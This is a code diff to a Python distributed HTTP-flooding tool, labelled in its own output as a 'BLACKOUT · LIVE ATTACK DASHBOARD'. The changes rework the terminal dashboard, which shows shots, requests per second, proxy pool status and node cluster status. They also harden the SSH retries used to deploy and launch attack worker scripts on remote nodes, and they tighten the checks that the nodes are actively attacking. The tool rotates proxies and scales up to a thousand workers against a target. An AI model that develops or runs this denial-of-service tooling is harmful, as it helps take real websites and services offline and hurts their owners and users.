@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import asyncio
+import shutil
 import aiohttp
 import random
 import string
@@ -52,15 +53,11 @@ def _restore_terminal():
 
 
 def _sigint_handler(signum, frame):
-    """
-    Only set the flag. Do NOT raise inside asyncio — it corrupts the loop.
-    If we're outside asyncio (blocked on input()), safe to raise.
-    """
     _INTERRUPTED[0] = True
     _restore_terminal()
     try:
         asyncio.get_running_loop()
-        return  # inside asyncio → flag is enough
+        return
     except RuntimeError:
         raise KeyboardInterrupt()
 
@@ -72,18 +69,14 @@ except Exception:
 
 
 async def interruptible_sleep(seconds):
-    """Sleep that wakes up quickly when _INTERRUPTED is set."""
-    end = time.time() + seconds
-    while time.time() < end:
+    end = time.monotonic() + seconds
+    while time.monotonic() < end:
         if _INTERRUPTED[0]:
             return
-        remaining = end - time.time()
+        remaining = end - time.monotonic()
         await asyncio.sleep(min(0.5, max(0.05, remaining)))
 
 
-# ==================================================================
-#    HIGH-PERFORMANCE NODE WORKER SCRIPT
-# ==================================================================
 NODE_SCRIPT = r'''#!/usr/bin/env python3
 import asyncio, ssl, random, string, sys, json, time, os, signal, base64
 import socket as _socket, ipaddress as _ipaddress, concurrent.futures, threading
@@ -227,7 +220,6 @@ def pick_proxy():
 
 
 def _sync_connect(proxy, host, port, use_ssl, timeout):
-    """Returns a PLAIN TCP socket. SSL handshake is done by asyncio later."""
     if proxy is None:
         s = _socket.create_connection((host, port), timeout=timeout)
         s.setblocking(False)
@@ -684,18 +676,21 @@ def random_string(length=12):
 
 class LiveDashboard:
     _THROTTLE_SEC = 3
-    _MAX_PROXY_ROWS = 10
+    _RENDER_INTERVAL = 0.5
+    _RENDER_INTERVAL_HEAVY = 1.0
+    _RENDER_INTERVAL_VERY_HEAVY = 2.0
 
     def __init__(self):
         self.enabled = False
+        self._is_tty = False
         self.target = ""
         self.engine = ""
         self.safe_mode = False
         self.workers = 0
         self.workers_min = 50
         self.workers_max = 1000
-        self.duration = 0
-        self.start_time = 0
+        self.duration = 0.0
+        self.start_time = 0.0
         self.master_stats = {}
         self.events = {}
         self.recent_logs = []
@@ -703,33 +698,78 @@ class LiveDashboard:
         self.last_render = 0.0
         self._log_throttle = {}
         self._log_suppressed = {}
-        self._prev_line_count = 0
-        self._first_render = True
+        self._last_total_shots = 0
         self.rps_limit = 0
+        self._active = False
+        self._last_rps = 0
+        self._last_size = (0, 0)
+
+    @staticmethod
+    def _term_size():
+        try:
+            sz = shutil.get_terminal_size(fallback=(120, 35))
+            return max(40, int(sz.columns)), max(12, int(sz.lines))
+        except Exception:
+            return 120, 35
 
     def start(self, target, engine, safe_mode, workers, workers_min,
               workers_max, duration, stats, rps_limit=0):
+        try:
+            self._is_tty = sys.stdout.isatty()
+        except Exception:
+            self._is_tty = False
+
+        try:
+            duration = float(duration)
+        except Exception:
+            duration = 600.0
+        if duration <= 0 or duration > 86400 * 30:
+            duration = 600.0
+
         self.enabled = True
-        self.target = target
-        self.engine = engine
-        self.safe_mode = safe_mode
-        self.workers = workers
-        self.workers_min = workers_min
-        self.workers_max = workers_max
+        self.target = str(target or "")
+        self.engine = str(engine or "")
+        self.safe_mode = bool(safe_mode)
+        self.workers = int(workers)
+        self.workers_min = int(workers_min)
+        self.workers_max = int(workers_max)
         self.duration = duration
-        self.start_time = time.time()
+        self.start_time = time.monotonic()
         self.master_stats = stats
         self.events = {}
         self.recent_logs = []
         self.last_render = 0.0
         self._log_throttle = {}
         self._log_suppressed = {}
-        self._prev_line_count = 0
-        self._first_render = True
-        self.rps_limit = rps_limit
+        self._last_total_shots = 0
+        self.rps_limit = int(rps_limit) if rps_limit else 0
+        self._last_rps = 0
+        self._last_size = (0, 0)
+
+        if not self._is_tty:
+            self.enabled = False
+            self._active = False
+            return
+
+        try:
+            sys.stdout.write("\033[?25l")
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.flush()
+            self._active = True
+        except Exception:
+            self._active = False
 
     def stop(self):
         self.enabled = False
+        if not self._active:
+            return
+        try:
+            sys.stdout.write("\033[?25h")
+            sys.stdout.write("\n")
+            sys.stdout.flush()
+        except Exception:
+            pass
+        self._active = False
 
     def add_event(self, label, n=1):
         self.events[label] = self.events.get(label, 0) + n
@@ -765,7 +805,7 @@ class LiveDashboard:
                 message = f"{message}  {Colors.DIM}(+{suppressed} suppressed){Colors.RESET}"
 
         self.recent_logs.append((status_type, message, time.time()))
-        if len(self.recent_logs) > 8:
+        if len(self.recent_logs) > 30:
             self.recent_logs.pop(0)
 
     def _event_color(self, name):
@@ -809,9 +849,328 @@ class LiveDashboard:
             return f"{Colors.MAGENTA}● PROXY{Colors.RESET}"
         return f"{Colors.RED}● {status_type}{Colors.RESET}"
 
+    @staticmethod
+    def _fmt_time(seconds):
+        try:
+            seconds = float(seconds)
+        except Exception:
+            seconds = 0.0
+        if seconds < 0 or seconds != seconds:
+            seconds = 0.0
+        seconds = min(seconds, 86400 * 30)
+        total = int(seconds)
+        if total >= 3600:
+            h = total // 3600
+            m = (total % 3600) // 60
+            s = total % 60
+            return f"{h:02d}:{m:02d}:{s:02d}"
+        m = total // 60
+        s = total % 60
+        return f"{m:02d}:{s:02d}"
+
+    def _sec_header(self, budget):
+        if budget < 4:
+            return []
+        return [
+            "",
+            f"  {Colors.BOLD}{Colors.RED}● BLACKOUT · LIVE ATTACK DASHBOARD{Colors.RESET}",
+            f"  {Colors.DIM}{'─' * 76}{Colors.RESET}",
+            "",
+        ]
+
+    def _sec_attack(self, budget, elapsed, remaining):
+        if budget < 5:
+            ms = self.master_stats or {}
+            return [
+                f"  {Colors.BOLD}● ATTACK{Colors.RESET}  "
+                f"Elapsed {self._fmt_time(elapsed)}  ·  "
+                f"Shots {ms.get('requests', 0):,}  ·  "
+                f"OK {ms.get('success', 0):,}  ·  "
+                f"TO {ms.get('timeouts', 0):,}",
+            ]
+        lines = []
+        ms = self.master_stats or {}
+        total_shots = ms.get("requests", 0)
+        rps = total_shots / elapsed if elapsed > 0 else 0
+
+        target_disp = self.target
+        if len(target_disp) > 58:
+            target_disp = target_disp[:55] + "..."
+
+        sm = (f"{Colors.GREEN}ON{Colors.RESET}" if self.safe_mode
+              else f"{Colors.DIM}OFF{Colors.RESET}")
+
+        if self.rps_limit and self.rps_limit > 0:
+            rps_limit_str = f"  {Colors.DIM}· {self.rps_limit} rps/worker{Colors.RESET}"
+        else:
+            rps_limit_str = f"  {Colors.DIM}· unlimited{Colors.RESET}"
+
+        lines.append(f"  {Colors.BOLD}● ATTACK STATUS{Colors.RESET}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Engine        {Colors.BOLD}{self.engine}{Colors.RESET}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Target        {Colors.DIM}{target_disp}{Colors.RESET}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Safe Mode     {sm}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Workers       "
+                     f"{Colors.BOLD}{self.workers}{Colors.RESET}  "
+                     f"{Colors.DIM}(min {self.workers_min} · max {self.workers_max}){Colors.RESET}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Elapsed       "
+                     f"{Colors.BOLD}{self._fmt_time(elapsed)}{Colors.RESET}  "
+                     f"{Colors.DIM}(remaining {self._fmt_time(remaining)}){Colors.RESET}")
+        lines.append(f"  {Colors.DIM}├─{Colors.RESET} Total Shots   "
+                     f"{Colors.BOLD}{total_shots:,}{Colors.RESET}  "
+                     f"{Colors.DIM}·  {rps:,.1f} req/s{Colors.RESET}{rps_limit_str}")
+        lines.append(
+            f"  {Colors.DIM}└─{Colors.RESET} Master        "
+            f"{Colors.GREEN}OK {ms.get('success', 0):,}{Colors.RESET}  "
+            f"{Colors.RED}5xx {ms.get('server_error', 0):,}{Colors.RESET}  "
+            f"{Colors.RED}TO {ms.get('timeouts', 0):,}{Colors.RESET}  "
+            f"{Colors.RED}403 {ms.get('blocked', 0):,}{Colors.RESET}  "
+            f"{Colors.YELLOW}429 {ms.get('rate_limit', 0):,}{Colors.RESET}"
+        )
+        lines.append("")
+        self._last_rps = rps
+        return lines
+
+    def _sec_nodes(self, budget, elapsed):
+        if budget < 2 or not self.nodes:
+            return []
+        lines = []
+        attacking = sum(
+            1 for n in self.nodes if getattr(n, "live_running", False)
+        )
+        lines.append(
+            f"  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER{Colors.RESET}  "
+            f"{Colors.DIM}({len(self.nodes)} nodes · {attacking} active){Colors.RESET}"
+        )
+        row_budget = budget - 2
+        if row_budget < 1:
+            return lines + [""]
+
+        show_count = min(len(self.nodes), row_budget)
+        needs_more = len(self.nodes) > show_count
+        if needs_more and show_count > 0:
+            show_count -= 1
+
+        shown = self.nodes[:show_count]
+        for i, n in enumerate(shown):
+            is_last = (i == len(shown) - 1) and not needs_more
+            prefix = "└─" if is_last else "├─"
+            req = getattr(n, "live_requests", 0)
+            ok = getattr(n, "live_success", 0)
+            to = getattr(n, "live_timeouts", 0)
+            se = getattr(n, "live_srv_err", 0)
+            running = getattr(n, "live_running", False)
+
+            if not running:
+                st = f"{Colors.GREEN}DONE{Colors.RESET}"
+            elif req == 0 and elapsed > 30:
+                st = f"{Colors.RED}{Colors.BOLD}STALLED{Colors.RESET}"
+            else:
+                st = f"{Colors.MAGENTA}ATTACKING{Colors.RESET}"
+
+            try:
+                label = n.label()
+            except Exception:
+                label = f"{getattr(n, 'ip', '?')}:{getattr(n, 'port', 22)}"
+            if len(label) > 22:
+                label = label[:19] + "..."
+
+            lines.append(
+                f"  {Colors.DIM}{prefix}{Colors.RESET} "
+                f"{label:<22}  "
+                f"REQ {req:>8,}  "
+                f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
+                f"{Colors.RED}TO {to:>7,}{Colors.RESET}  "
+                f"{Colors.RED}5xx {se:>6,}{Colors.RESET}  [{st}]"
+            )
+
+        if needs_more:
+            remaining = len(self.nodes) - show_count
+            lines.append(
+                f"  {Colors.DIM}└─{Colors.RESET} "
+                f"{Colors.DIM}... and {remaining} more nodes{Colors.RESET}"
+            )
+        lines.append("")
+        return lines
+
+    def _sec_proxies(self, budget):
+        try:
+            proxy_sessions = list(PROXY_MANAGER.sessions.keys())
+        except Exception:
+            proxy_sessions = []
+        if budget < 2 or not proxy_sessions:
+            return []
+
+        lines = []
+        alive_cnt = 0
+        for p in proxy_sessions:
+            st = PROXY_MANAGER.proxy_stats.get(p, {})
+            if not st.get("dead", False):
+                alive_cnt += 1
+
+        lines.append(
+            f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
+            f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
+            f"{alive_cnt} alive / {len(proxy_sessions)} total){Colors.RESET}"
+        )
+
+        row_budget = min(4, budget - 2)
+        if row_budget < 1:
+            return lines + [""]
+
+        sorted_proxies = sorted(
+            proxy_sessions,
+            key=lambda p: PROXY_MANAGER.proxy_stats.get(p, {}).get("requests", 0),
+            reverse=True,
+        )
+        show_count = min(len(sorted_proxies), row_budget)
+        needs_more = len(sorted_proxies) > show_count
+        if needs_more and show_count > 0:
+            show_count -= 1
+
+        shown = sorted_proxies[:show_count]
+        for i, p in enumerate(shown):
+            is_last = (i == len(shown) - 1) and not needs_more
+            prefix = "└─" if is_last else "├─"
+            st = PROXY_MANAGER.proxy_stats.get(p, {})
+            req = st.get("requests", 0)
+            ok = st.get("success", 0)
+            fl = st.get("fails", 0)
+            lat = st.get("latency_ms", 0)
+            dead = st.get("dead", False)
+            status_str = (f"{Colors.RED}DEAD {Colors.RESET}"
+                          if dead else f"{Colors.GREEN}ALIVE{Colors.RESET}")
+            p_short = p
+            if len(p_short) > 42:
+                p_short = p_short[:39] + "..."
+            lines.append(
+                f"  {Colors.DIM}{prefix}{Colors.RESET} "
+                f"{Colors.MAGENTA}{p_short:<42}{Colors.RESET}  "
+                f"{status_str}  "
+                f"REQ {req:>7,}  "
+                f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
+                f"{Colors.RED}FAIL {fl:>5,}{Colors.RESET}  "
+                f"{Colors.DIM}{lat:>4}ms{Colors.RESET}"
+            )
+
+        if needs_more:
+            remaining = len(sorted_proxies) - show_count
+            lines.append(
+                f"  {Colors.DIM}└─{Colors.RESET} "
+                f"{Colors.DIM}... and {remaining} more proxies{Colors.RESET}"
+            )
+        lines.append("")
+        return lines
+
+    def _sec_events(self, budget):
+        if budget < 2 or not self.events:
+            return []
+        lines = [f"  {Colors.BOLD}● LIVE EVENTS{Colors.RESET}"]
+        for name, count in sorted(self.events.items()):
+            color = self._event_color(name)
+            lines.append(
+                f"  {Colors.DIM}├─{Colors.RESET} "
+                f"{color}{name:<38}{Colors.RESET}  "
+                f"{Colors.BOLD}{count:>10,}{Colors.RESET}"
+            )
+        lines.append("")
+        return lines
+
+    def _sec_activity(self, budget):
+        if budget < 2 or not self.recent_logs:
+            return []
+        lines = [f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}"]
+
+        row_budget = min(5, budget - 2)
+        if row_budget < 1:
+            return lines + [""]
+
+        logs = list(reversed(self.recent_logs))
+        show_count = min(len(logs), row_budget)
+        shown = logs[:show_count]
+        for status_type, msg, ts in shown:
+            ts_str = time.strftime("%H:%M:%S", time.localtime(ts))
+            pfx = self._log_prefix(status_type)
+            lines.append(f"  {Colors.DIM}{ts_str}{Colors.RESET}  {pfx}  {msg}")
+        lines.append("")
+        return lines
+
+    def _sec_footer(self, budget):
+        if budget < 1:
+            return []
+        return [
+            f"  {Colors.DIM}[Ctrl+C to abort]  ·  rendered "
+            f"{time.strftime('%H:%M:%S')}{Colors.RESET}",
+        ]
+
+    def _allocate_budgets(self, total_rows):
+        HEADER_MIN = 4
+        ATTACK_MIN = 5
+        ATTACK_FULL = 9
+        FOOTER_MIN = 1
+        PROXIES_FIXED = 6
+        ACTIVITY_FIXED = 7
+
+        events_need = (len(self.events) + 2) if self.events else 0
+
+        header = HEADER_MIN
+        attack = ATTACK_FULL
+        footer = FOOTER_MIN
+        proxies = PROXIES_FIXED
+        activity = ACTIVITY_FIXED
+        events = events_need
+
+        def total():
+            return header + attack + footer + proxies + activity + events
+
+        if total() > total_rows:
+            excess = total() - total_rows
+            take = min(excess, activity)
+            activity -= take
+        if total() > total_rows:
+            excess = total() - total_rows
+            take = min(excess, proxies)
+            proxies -= take
+        if total() > total_rows:
+            attack = ATTACK_MIN
+        if total() > total_rows:
+            header = 0
+        if total() > total_rows:
+            excess = total() - total_rows
+            take = min(excess, attack)
+            attack -= take
+        if total() > total_rows:
+            attack = 0
+            header = 0
+
+        budgets = {
+            "header": header,
+            "attack": attack,
+            "footer": footer,
+            "proxies": proxies,
+            "activity": activity,
+            "events": events,
+            "nodes": 0,
+        }
+
+        remaining = max(0, total_rows - total())
+        if remaining >= 2:
+            budgets["nodes"] = remaining
+
+        return budgets
+
     def render(self, force=False):
-        now = time.time()
-        if not force and (now - self.last_render) < 0.5:
+        if not self.enabled or not self._active:
+            return
+
+        now = time.monotonic()
+
+        interval = self._RENDER_INTERVAL
+        if self._last_rps > 20000:
+            interval = self._RENDER_INTERVAL_VERY_HEAVY
+        elif self._last_rps > 5000:
+            interval = self._RENDER_INTERVAL_HEAVY
+
+        if not force and (now - self.last_render) < interval:
             return
         self.last_render = now
 
@@ -820,203 +1179,43 @@ class LiveDashboard:
         self._rendering = True
 
         try:
-            lines = []
-            lines.append("")
-            lines.append(f"  {Colors.BOLD}{Colors.RED}● BLACKOUT · LIVE ATTACK DASHBOARD{Colors.RESET}")
-            lines.append(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}")
-            lines.append("")
+            term_cols, term_rows = self._term_size()
+            max_total_lines = max(10, term_rows - 1)
 
             elapsed = now - self.start_time
-            remaining = max(0, self.duration - elapsed)
-            elapsed_str = f"{int(elapsed // 60):02d}:{int(elapsed % 60):02d}"
-            remaining_str = f"{int(remaining // 60):02d}:{int(remaining % 60):02d}"
+            if elapsed < 0 or elapsed != elapsed:
+                elapsed = 0.0
+            remaining = max(0.0, self.duration - elapsed)
+            if remaining > 86400 * 30:
+                remaining = 0.0
 
-            ms = self.master_stats or {}
-            total_shots = ms.get("requests", 0)
-            rps = total_shots / elapsed if elapsed > 0 else 0
+            budgets = self._allocate_budgets(max_total_lines)
 
-            target_disp = self.target
-            if len(target_disp) > 58:
-                target_disp = target_disp[:55] + "..."
+            header_lines = self._sec_header(budgets["header"])
+            attack_lines = self._sec_attack(budgets["attack"], elapsed, remaining)
+            node_lines = self._sec_nodes(budgets["nodes"], elapsed)
+            event_lines = self._sec_events(budgets["events"])
+            proxy_lines = self._sec_proxies(budgets["proxies"])
+            activity_lines = self._sec_activity(budgets["activity"])
+            footer_lines = self._sec_footer(budgets["footer"])
 
-            sm = (f"{Colors.GREEN}ON{Colors.RESET}" if self.safe_mode
-                  else f"{Colors.DIM}OFF{Colors.RESET}")
+            all_lines = (header_lines + attack_lines +
+                         event_lines + node_lines +
+                         proxy_lines + activity_lines +
+                         footer_lines)
 
-            if self.rps_limit and self.rps_limit > 0:
-                rps_limit_str = f"  {Colors.DIM}· {self.rps_limit} rps/worker{Colors.RESET}"
-            else:
-                rps_limit_str = f"  {Colors.DIM}· unlimited{Colors.RESET}"
+            if len(all_lines) > max_total_lines:
+                all_lines = all_lines[:max_total_lines]
 
-            lines.append(f"  {Colors.BOLD}● ATTACK STATUS{Colors.RESET}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Engine        {Colors.BOLD}{self.engine}{Colors.RESET}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Target        {Colors.DIM}{target_disp}{Colors.RESET}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Safe Mode     {sm}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Workers       "
-                         f"{Colors.BOLD}{self.workers}{Colors.RESET}  "
-                         f"{Colors.DIM}(min {self.workers_min} · max {self.workers_max}){Colors.RESET}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Elapsed       "
-                         f"{Colors.BOLD}{elapsed_str}{Colors.RESET}  "
-                         f"{Colors.DIM}(remaining {remaining_str}){Colors.RESET}")
-            lines.append(f"  {Colors.DIM}├─{Colors.RESET} Total Shots   "
-                         f"{Colors.BOLD}{total_shots:,}{Colors.RESET}  "
-                         f"{Colors.DIM}·  {rps:,.1f} req/s{Colors.RESET}{rps_limit_str}")
-            lines.append(
-                f"  {Colors.DIM}└─{Colors.RESET} Master        "
-                f"{Colors.GREEN}OK {ms.get('success', 0):,}{Colors.RESET}  "
-                f"{Colors.RED}5xx {ms.get('server_error', 0):,}{Colors.RESET}  "
-                f"{Colors.RED}TO {ms.get('timeouts', 0):,}{Colors.RESET}  "
-                f"{Colors.RED}403 {ms.get('blocked', 0):,}{Colors.RESET}  "
-                f"{Colors.YELLOW}429 {ms.get('rate_limit', 0):,}{Colors.RESET}"
-            )
-            lines.append("")
-
-            if self.nodes:
-                attacking = sum(
-                    1 for n in self.nodes
-                    if getattr(n, "live_running", False)
-                )
-                lines.append(
-                    f"  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER{Colors.RESET}  "
-                    f"{Colors.DIM}({len(self.nodes)} nodes · {attacking} attacking){Colors.RESET}"
-                )
-                for i, n in enumerate(self.nodes):
-                    prefix = "└─" if i == len(self.nodes) - 1 else "├─"
-                    req = getattr(n, "live_requests", 0)
-                    ok = getattr(n, "live_success", 0)
-                    to = getattr(n, "live_timeouts", 0)
-                    se = getattr(n, "live_srv_err", 0)
-                    running = getattr(n, "live_running", False)
-                    st = (f"{Colors.MAGENTA}ATTACKING{Colors.RESET}"
-                          if running else f"{Colors.GREEN}DONE{Colors.RESET}")
-                    try:
-                        label = n.label()
-                    except Exception:
-                        label = f"{getattr(n, 'ip', '?')}:{getattr(n, 'port', 22)}"
-                    if len(label) > 22:
-                        label = label[:19] + "..."
-                    lines.append(
-                        f"  {Colors.DIM}{prefix}{Colors.RESET} "
-                        f"{label:<22}  "
-                        f"REQ {req:>8,}  "
-                        f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
-                        f"{Colors.RED}TO {to:>7,}{Colors.RESET}  "
-                        f"{Colors.RED}5xx {se:>6,}{Colors.RESET}  [{st}]"
-                    )
-                lines.append("")
-
-            # ============================================================
-            #  PROXY POOL — capped at _MAX_PROXY_ROWS to keep fixed height
-            # ============================================================
-            try:
-                proxy_sessions = list(PROXY_MANAGER.sessions.keys())
-            except Exception:
-                proxy_sessions = []
-            if proxy_sessions:
-                alive_cnt = 0
-                for p in proxy_sessions:
-                    st = PROXY_MANAGER.proxy_stats.get(p, {})
-                    if not st.get("dead", False):
-                        alive_cnt += 1
-                lines.append(
-                    f"  {Colors.BOLD}{Colors.MAGENTA}● PROXY POOL{Colors.RESET}  "
-                    f"{Colors.DIM}(mode: {PROXY_MANAGER.rotation_mode} · "
-                    f"{alive_cnt} alive / {len(proxy_sessions)} total){Colors.RESET}"
-                )
-
-                sorted_proxies = sorted(
-                    proxy_sessions,
-                    key=lambda p: PROXY_MANAGER.proxy_stats.get(p, {}).get("requests", 0),
-                    reverse=True,
-                )
-                shown = sorted_proxies[:self._MAX_PROXY_ROWS]
-                remaining = len(sorted_proxies) - len(shown)
-
-                for i, p in enumerate(shown):
-                    is_last = (i == len(shown) - 1) and (remaining == 0)
-                    prefix = "└─" if is_last else "├─"
-                    st = PROXY_MANAGER.proxy_stats.get(p, {})
-                    req = st.get("requests", 0)
-                    ok = st.get("success", 0)
-                    fl = st.get("fails", 0)
-                    lat = st.get("latency_ms", 0)
-                    dead = st.get("dead", False)
-                    status_str = (f"{Colors.RED}DEAD {Colors.RESET}"
-                                  if dead else f"{Colors.GREEN}ALIVE{Colors.RESET}")
-                    p_short = p
-                    if len(p_short) > 42:
-                        p_short = p_short[:39] + "..."
-                    lines.append(
-                        f"  {Colors.DIM}{prefix}{Colors.RESET} "
-                        f"{Colors.MAGENTA}{p_short:<42}{Colors.RESET}  "
-                        f"{status_str}  "
-                        f"REQ {req:>7,}  "
-                        f"{Colors.GREEN}OK {ok:>7,}{Colors.RESET}  "
-                        f"{Colors.RED}FAIL {fl:>5,}{Colors.RESET}  "
-                        f"{Colors.DIM}{lat:>4}ms{Colors.RESET}"
-                    )
-
-                if remaining > 0:
-                    lines.append(
-                        f"  {Colors.DIM}└─{Colors.RESET} "
-                        f"{Colors.DIM}... and {remaining} more proxies "
-                        f"(top {self._MAX_PROXY_ROWS} by req count){Colors.RESET}"
-                    )
-
-                lines.append("")
-
-            if self.events:
-                lines.append(f"  {Colors.BOLD}● LIVE EVENTS{Colors.RESET}")
-                event_items = sorted(self.events.items())
-                for i, (name, count) in enumerate(event_items):
-                    prefix = "└─" if i == len(event_items) - 1 else "├─"
-                    color = self._event_color(name)
-                    lines.append(
-                        f"  {Colors.DIM}{prefix}{Colors.RESET} "
-                        f"{color}{name:<38}{Colors.RESET}  "
-                        f"{Colors.BOLD}{count:>10,}{Colors.RESET}"
-                    )
-                lines.append("")
-
-            if self.recent_logs:
-                lines.append(f"  {Colors.BOLD}● RECENT ACTIVITY{Colors.RESET}")
-                for status_type, msg, ts in self.recent_logs:
-                    ts_str = time.strftime("%H:%M:%S", time.localtime(ts))
-                    pfx = self._log_prefix(status_type)
-                    lines.append(f"  {Colors.DIM}{ts_str}{Colors.RESET}  {pfx}  {msg}")
-                lines.append("")
-
-            lines.append(f"  {Colors.DIM}[Ctrl+C to abort]  ·  rendered "
-                         f"{time.strftime('%H:%M:%S')}{Colors.RESET}")
-            lines.append("")
-
-            buf = []
-
-            if self._first_render:
-                buf.append("\033[?25l")
-                buf.append("\033[2J\033[H")
-                for line in lines:
-                    buf.append(line)
-                    buf.append("\033[K")
+            buf = ["\033[H"]
+            num_lines = len(all_lines)
+            for i, line in enumerate(all_lines):
+                buf.append(line)
+                buf.append("\033[K")
+                if i < num_lines - 1:
                     buf.append("\n")
-                buf.append(f"\033[{len(lines)}A")
-                buf.append("\033[s")
-                self._first_render = False
-            else:
-                buf.append("\033[u")
-                for i, line in enumerate(lines):
-                    buf.append(line)
-                    buf.append("\033[K")
-                    if i < len(lines) - 1:
-                        buf.append("\n")
-                if len(lines) < self._prev_line_count:
-                    leftover = self._prev_line_count - len(lines)
-                    for _ in range(leftover):
-                        buf.append("\n\033[K")
-                    buf.append(f"\033[{leftover}A")
-                buf.append(f"\033[{len(lines)-1}A")
-                buf.append("\033[s")
+            buf.append("\033[J")
 
-            self._prev_line_count = len(lines)
             sys.stdout.write("".join(buf))
             sys.stdout.flush()
 
@@ -1231,8 +1430,6 @@ class ProxyManager:
                     pass
 
     async def validate_all(self):
-        """Validate all proxies with a single-line progress bar.
-        No per-proxy DEAD/ALIVE spam — only final summary is printed."""
         if not self.all_proxies:
             return 0, 0, "No proxies loaded"
 
@@ -1528,6 +1725,8 @@ class NodeInfo:
         self.live_timeouts = 0
         self.live_srv_err = 0
         self.live_running = False
+        self._last_req_seen = 0
+        self._last_req_ts = 0
 
     def label(self):
         return f"{self.ip}:{self.port}"
@@ -1592,28 +1791,54 @@ class NodeManager:
             node.error_msg = "paramiko missing"
             return False
 
+        if node.client is not None:
+            try:
+                node.client.close()
+            except Exception:
+                pass
+            node.client = None
+
         def _connect():
             c = paramiko.SSHClient()
             c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             c.connect(
                 hostname=node.ip, port=node.port,
                 username=node.username, password=node.password,
-                timeout=15, banner_timeout=15, auth_timeout=15,
+                timeout=25,
+                banner_timeout=30,
+                auth_timeout=25,
                 look_for_keys=False, allow_agent=False,
             )
             return c
 
         node.status = "connecting"
-        try:
-            node.client = await asyncio.to_thread(_connect)
-            node.status = "connected"
-            node.error_msg = None
-            return True
-        except Exception as e:
-            node.status = "error"
-            node.error_msg = str(e)[:70]
-            node.client = None
-            return False
+        last_err = None
+        for attempt in range(2):
+            try:
+                node.client = await asyncio.to_thread(_connect)
+                node.status = "connected"
+                node.error_msg = None
+                return True
+            except paramiko.ssh_exception.SSHException as e:
+                last_err = e
+                err_name = type(e).__name__
+                err_msg = str(e)[:70]
+                if "banner" in err_msg.lower() or "session" in err_msg.lower():
+                    await asyncio.sleep(1.5)
+                    continue
+                break
+            except Exception as e:
+                last_err = e
+                break
+
+        node.status = "error"
+        if last_err is not None:
+            msg = str(last_err)[:70] if str(last_err) else type(last_err).__name__
+            node.error_msg = f"{type(last_err).__name__}: {msg}"
+        else:
+            node.error_msg = "unknown connection error"
+        node.client = None
+        return False
 
     async def exec_cmd(self, node, cmd, timeout=30):
         if not node.client:
@@ -1758,26 +1983,38 @@ class NodeManager:
         )
         await self.exec_cmd(node, cmd, timeout=10)
 
-        for _ in range(12):
+        best_requests = 0
+        for _ in range(40):
             await asyncio.sleep(0.5)
             check_out, _ = await self.exec_cmd(
                 node,
                 "if [ -f /tmp/node_attack_status.json ]; then "
                 "  echo -n 'OK:'; "
-                "  cat /tmp/node_attack_status.json; "
+                "  cat /tmp/node_attack_status.json 2>/dev/null; "
                 "else echo 'WAIT'; fi",
                 timeout=5
             )
-            if check_out.startswith("OK:") and "requests" in check_out:
-                node.status = "attacking"
-                node.error_msg = None
-                return True
+            if check_out.startswith("OK:"):
+                try:
+                    payload = check_out[3:].strip()
+                    if payload.startswith("{"):
+                        data = json.loads(payload.split("\n", 1)[0])
+                        req = int(data.get("requests", 0))
+                        if req > best_requests:
+                            best_requests = req
+                        if req > 0:
+                            node.status = "attacking"
+                            node.error_msg = None
+                            return True
+                except Exception:
+                    pass
 
         log_out, _ = await self.exec_cmd(
             node,
             "echo '=== nohup.out ==='; tail -10 /tmp/nohup.out 2>/dev/null; "
             "echo '=== log ==='; tail -10 /tmp/node_attack.log 2>/dev/null; "
-            "echo '=== pids ==='; ps aux | grep '[n]ode_attack' | head -3",
+            "echo '=== pids ==='; ps aux | grep '[n]ode_attack' | head -3; "
+            "echo '=== pid_file ==='; cat /tmp/node_attack.pid 2>/dev/null",
             timeout=8
         )
         node.error_msg = (log_out.strip()[:200] if log_out.strip()
@@ -1822,7 +2059,7 @@ class NodeManager:
             "  MT=$(stat -c %Y /tmp/node_attack_status.json 2>/dev/null); "
             "  if [ -z \"$MT\" ]; then MT=0; fi; "
             "  AGE=$((NOW - MT)); "
-            "  if [ \"$AGE\" -lt 8 ]; then echo -n 'R|'; else echo -n 'S|'; fi; "
+            "  if [ \"$AGE\" -lt 20 ]; then echo -n 'R|'; else echo -n 'S|'; fi; "
             "  head -c 4000 /tmp/node_attack_status.json; "
             "else "
             "  echo -n 'M|{}'; "
@@ -1933,7 +2170,7 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
         rps_limiter = RateLimiter(rps)
 
         tasks = []
-        start_time = time.time()
+        start_time = time.monotonic()
         end_time = start_time + duration
 
         SAFE_MODE.reset(enabled=safe_mode)
@@ -1983,11 +2220,11 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                        "server_error", "timeouts", "dropped"]}
 
         try:
-            while time.time() < end_time:
+            while time.monotonic() < end_time:
                 await interruptible_sleep(ADJUST_INTERVAL)
                 if _INTERRUPTED[0]:
                     break
-                if time.time() >= end_time:
+                if time.monotonic() >= end_time:
                     break
 
                 if SAFE_MODE.enabled and SAFE_MODE.active:
@@ -2032,7 +2269,7 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                     for _ in range(add_count):
                         task = asyncio.create_task(
                             worker_func(direct_session, target_url,
-                                        end_time - time.time(), stats,
+                                        end_time - time.monotonic(), stats,
                                         use_proxy, SAFE_MODE, rps_limiter)
                         )
                         tasks.append(task)
